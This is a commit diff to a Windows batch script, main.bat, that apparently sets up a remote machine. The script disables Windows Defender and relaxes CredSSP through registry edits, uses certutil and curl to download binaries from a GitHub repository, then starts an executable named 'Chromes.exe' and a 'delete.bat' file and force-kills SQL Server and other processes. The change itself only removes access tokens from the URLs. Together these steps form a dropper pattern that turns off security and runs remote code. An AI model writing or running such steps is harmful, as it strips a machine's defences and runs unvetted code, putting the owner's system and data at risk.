5d3f4c02baa4035b9c44fc33610379179949b3d9
syedshariq121 <79070083+syedshariq121@users.noreply.github.com>
2021-02-16 08:57:11 +0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -2,17 +2,17 @@
 
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\ /v AllowEncryptionOracle /t REG_DWORD /d 2
-certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/curl.exe?token=AS3IHA5UX43BCH2I6FPVQYDAFMZ4Q C:\curl.exe
-certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.dll?token=AS3IHA6XACLQGOZYJNWM7VTAFMZ6Y C:\7z.dll
-certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.exe?token=AS3IHA473GH32DKG6JSJFRTAFMZ7Y C:\7z.exe
+certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/curl.exe
+certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.dll
+certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.exe
 
 cd C:\Users\Administrator\Desktop
-C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/ChromeSetup.exe?token=AS3IHA7AIJOOP4XSSGYJEWLAFM3IS C:\Chromes.exe
-C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat?token=AS3IHAZKW7NJCVMPO4YWDWTAFM3J2 C:\delete.bat
-start C:\Chromes.exe
+C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/Chromes.exe
+C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat
+start Chromes.exe
 cls
 @echo off
-start C:\delete.bat
+start delete.bat
 net start audiosrv
 taskkill /f /im sqlservr.exe
 taskkill /f /im Batch.exe
